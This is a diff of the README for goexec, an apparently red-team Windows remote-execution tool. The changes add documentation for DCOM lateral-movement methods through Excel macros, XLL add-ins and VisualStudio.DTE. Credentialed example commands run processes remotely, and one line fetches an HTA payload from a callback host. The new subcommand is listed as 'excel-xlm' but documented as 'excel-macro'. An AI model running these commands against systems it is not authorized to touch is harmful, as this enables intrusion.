@@ -31,7 +31,7 @@ cd goexec
 CGO_ENABLED=0 go build -ldflags="-s -w"
 
 # (Optional) Install goexec to /usr/local/bin/goexec
-sudo install ./goexec /usr/local/bin
+sudo install goexec /usr/local/bin
 ```
 
 ### Install with Docker
@@ -94,8 +94,8 @@ Authentication:
 
 ### Fetching Remote Process Output
 
-Although not recommended for live engagements or monitored environments due to OPSEC concerns, we've included the optional ability to fetch program output via SMB file transfer with the `-o`/`--output` flag.
-Use of this flag will wrap the supplied command in `cmd.exe /c ... > \Windows\Temp\RANDOM` where `RANDOM` is a random GUID, then fetch the output file via SMB file transfer.
+Although not recommended for live engagements or monitored environments due to OPSEC concerns, we've included the optional ability to fetch program output via SMB file transfer with the `-o`/`--out` flag.
+Use of this flag will wrap the supplied command in `cmd.exe /c... >\Windows\Temp\RANDOM` where `RANDOM` is a random GUID, then fetch the output file via SMB file transfer.
 By default, the output collection will time out after 1 minute, but this can be adjusted with the `--out-timeout` flag.
 
 
@@ -193,11 +193,11 @@ goexec wmi call "$target" \
 
 ### DCOM Module (`dcom`)
 
-The `dcom` module uses exposed Distributed Component Object Model (DCOM) objects to spawn processes.
+The `dcom` module uses exposed Distributed Component Object Model (DCOM) objects to gain remote execution.
 
 > [!WARNING]
 > The DCOM module is generally less reliable than other modules because the underlying methods are often reliant on the target Windows version and specific Windows settings.
-> Kerberos auth is not officially supported by the DCOM module, but kudos if you can get it to work.
+> Additionally, Kerberos auth is not officially supported by the DCOM module, but kudos if you can get it to work.
 
 ```text
 Usage:
@@ -208,6 +208,9 @@ Available Commands:
   shellwindows       Execute with the ShellWindows DCOM object
   shellbrowserwindow Execute with the ShellBrowserWindow DCOM object
   htafile            Execute with the HTAFile DCOM object
+  excel-xlm          Execute with the Excel.Application DCOM object by executing an Excel macro
+  excel-xll          Execute with the Excel.Application DCOM object by registering an XLL add-in
+  vs-dte             Execute with the VisualStudio.DTE object
 
 ... [inherited flags] ...
 
@@ -381,11 +384,48 @@ goexec dcom htafile "$target" \
   --url "http://callback.lan/payload.hta"
 ```
 
+#### `Excel.Application::ExecuteExcel4Macro` Method (`dcom excel-macro`)
+
+The `excel-macro` method uses the exposed `Excel.Application` DCOM object to call [`ExecuteExcel4Macro`](https://learn.microsoft.com/en-us/office/vba/api/excel.application.executeexcel4macro) with an arbitrary Excel 4.0 macro.
+An Excel installation must be present on the remote host for this method to work.
+
+```text
+Usage:
+  goexec dcom excel-macro [target] [flags]
+
+Execution:
+  -M, --macro string           XLM macro
+      --macro-file file        XLM macro file
+  -e, --exec executable        Remote Windows executable to invoke
+  -a, --args string            Process command line arguments
+  -c, --command string         Windows process command line (executable & arguments)
+  -o, --out file               Fetch execution output to file or "-" for standard output
+  -m, --out-method string      Method to fetch execution output (default "smb")
+      --out-timeout duration   Output timeout duration (default 1m0s)
+      --no-delete-out          Preserve output file on remote filesystem
+
+... [inherited flags] ...
+```
+
+##### Examples
+
+```shell
+# Execute `query session` + print output
+goexec dcom excel-macro "$target" \
+  --user "${auth_user}@${domain}" \
+  --password "$auth_pass" \
+  --command 'query session' -o-
+
+# Example of calling a Win32 API procedure via XLM
+goexec dcom excel-macro "$target" \
+  --user "${auth_user}@${domain}" \
+  --password "$auth_pass" \
+  -M 'CALL("user32","MessageBoxA","JJCCJ",1,"GoExec rules","",0)'
+```
 
 ### Task Scheduler Module (`tsch`)
 
 The `tsch` module makes use of the Windows Task Scheduler service ([MS-TSCH](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-tsch/)) to spawn processes on the remote target.
-
 ```text
 Usage:
   goexec tsch [command] [flags]
